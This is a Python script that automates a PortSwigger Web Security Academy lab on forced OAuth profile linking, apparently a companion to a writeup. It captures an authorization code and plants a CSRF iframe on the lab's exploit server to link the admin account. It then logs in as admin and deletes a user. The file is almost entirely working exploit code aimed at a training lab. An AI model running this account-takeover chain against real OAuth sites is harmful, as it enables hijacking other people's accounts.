#!/usr/bin/env python3
"""
Forced OAuth profile linking
PortSwigger Web Security Academy -- OAuth authentication

Companion script for the writeup: 02-forced-oauth-profile-linking.md

What this does:
    /oauth-linking has no state parameter, so the authorization code it accepts
    is a bearer credential rather than proof of who requested it. This script logs
    in as wiener, starts the OAuth *linking* flow under a second client (so the
    blog session and the OAuth capture don't get tangled), intercepts its own
    authorization code before /oauth-linking redeems it, then builds a CSRF iframe
    that submits that code to /oauth-linking and hosts it on the lab's exploit
    server. Delivered to the admin, the admin's browser links wiener's OAuth
    identity to the admin account. Logging back in via "Login with social media"
    as wiener then authenticates as admin, and the script deletes carlos from the
    admin panel to trip the solve condition.

Usage:
    python 02-forced-oauth-profile-linking.py <lab-url>
    e.g. python 02-forced-oauth-profile-linking.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import time
import urllib.parse
import httpx


def _get_csrf(client: httpx.Client, url: str) -> str:
    r = client.get(url)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def solve(lab_url: str) -> None:
    c = httpx.Client(verify=False, follow_redirects=True, timeout=15)

    home = c.get(lab_url)
    exploit_m = re.search(r'(https://exploit-[^/]+\.exploit-server\.net)', home.text)
    if not exploit_m:
        print("[-] No exploit server found on the lab homepage.")
        return
    exploit_server = exploit_m.group(1)
    print(f"[*] Exploit server: {exploit_server}")

    # Step 1: log in as wiener normally.
    print("[*] Logging in as wiener...")
    csrf = _get_csrf(c, f"{lab_url}/login")
    c.post(f"{lab_url}/login", data={"csrf": csrf, "username": "wiener", "password": "peter"})

    # Step 2: start the OAuth *linking* flow under a separate client that shares
    # wiener's cookies but never follows the final redirect, so we can grab the
    # authorization code before /oauth-linking consumes it.
    print("[*] Initiating OAuth linking to get authorization code...")
    c2 = httpx.Client(verify=False, follow_redirects=False, timeout=15)
    for k, v in c.cookies.items():
        c2.cookies.set(k, v)

    r = c2.get(f"{lab_url}/social-login", follow_redirects=False)
    max_redirects = 10
    auth_code = None
    while r.status_code in (301, 302, 303, 307) and max_redirects > 0:
        location = r.headers.get("location", "")
        if not location.startswith("http"):
            parsed_prev = urllib.parse.urlparse(str(r.url))
            location = f"{parsed_prev.scheme}://{parsed_prev.netloc}{location}"

        code_match = re.search(r'[?&]code=([A-Za-z0-9_-]+)', location)
        if code_match and "/oauth-linking" in location:
            auth_code = code_match.group(1)
            print(f"[+] Intercepted authorization code: {auth_code}")
            break

        r = c2.get(location, follow_redirects=False)
        max_redirects -= 1
    c2.close()

    if not auth_code:
        print("[-] Could not intercept an authorization code.")
        return

    # Step 3: build the CSRF page and store it on the exploit server.
    linking_url = f"{lab_url}/oauth-linking?code={auth_code}"
    csrf_body = f'<iframe src="{linking_url}"></iframe>'

    print("[*] Deploying CSRF exploit...")
    c.post(
        f"{exploit_server}/",
        data={
            "urlIsHttps": "on",
            "responseFile": "/exploit",
            "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html",
            "responseBody": csrf_body,
            "formAction": "STORE",
        },
    )

    c.get(f"{exploit_server}/deliver-to-victim")
    print("[*] Exploit delivered to victim, waiting...")
    time.sleep(5)

    # Step 4: the admin's account is now linked to our OAuth identity. Log out
    # and log back in via OAuth -- we should now be admin.
    print("[*] Logging out and re-logging via OAuth...")
    c.get(f"{lab_url}/logout")
    c.get(f"{lab_url}/social-login")

    my_account = c.get(f"{lab_url}/my-account")
    if "admin" in my_account.text.lower():
        print("[+] Logged in as admin!")
        admin_page = c.get(f"{lab_url}/admin")
        delete_url = re.search(r'href="(/admin/delete\?username=carlos)"', admin_page.text)
        if delete_url:
            c.get(f"{lab_url}{delete_url.group(1)}")
            print("[+] Deleted carlos.")
    else:
        print("[-] Did not become admin after re-logging via OAuth.")

    check = c.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
